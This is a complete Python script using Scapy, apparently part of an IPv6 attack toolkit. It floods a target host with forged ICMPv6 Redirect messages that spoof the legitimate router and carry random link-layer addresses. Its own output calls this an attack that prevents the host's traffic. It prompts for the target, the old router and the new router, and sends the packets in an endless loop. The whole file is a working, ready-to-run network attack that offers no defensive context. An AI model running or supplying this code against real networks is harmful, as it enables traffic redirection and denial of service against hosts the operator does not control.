#!/usr/bin/python
import random
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr, \
    ICMPv6NDOptRedirectedHdr
from scapy.sendrecv import send


def flood_redirect():
    interface = input(" - Insert the interface, if you skip this by Enter, the packet is automatically "
                      "sent on every active interface: ")
    sip = input(" - Insert the source (target host) IPv6 address: ")
    dip = input(" - Insert the destination IPv6 address: ")
    old_router = input(" - Insert the IPv6 address of the old router: ")
    new_router = input(" - Insert the IPv6 address of the new router that you want to change traffic to: ")
    # Generate packet
    data = 16 * "A"
    base_1 = IPv6()
    base_1.src = dip
    base_1.dst = sip
    packet1 = base_1 / ICMPv6EchoRequest(data=data)

    base_2 = IPv6()
    base_2.src = old_router
    base_2.dst = sip

    print("Preventing traffic network from host " + sip + " with Redirect messages (press Ctrl C to stop the attack)")
    while True:
        try:
            random_mac = "01:02:03:%02x:%02x:%02x" % (random.randint(0, 255),
                                                      random.randint(0, 255),
                                                      random.randint(0, 255))
            packet2 = base_2 / ICMPv6ND_Redirect(tgt=new_router,
                                                 dst=dip) / \
                      ICMPv6NDOptDstLLAddr(lladdr=random_mac) / \
                      ICMPv6NDOptRedirectedHdr(pkt=packet1)
            if interface == "":
                send(packet2, verbose=False)
            else:
                send(packet2, verbose=False, iface=interface)
        except KeyboardInterrupt:
            break

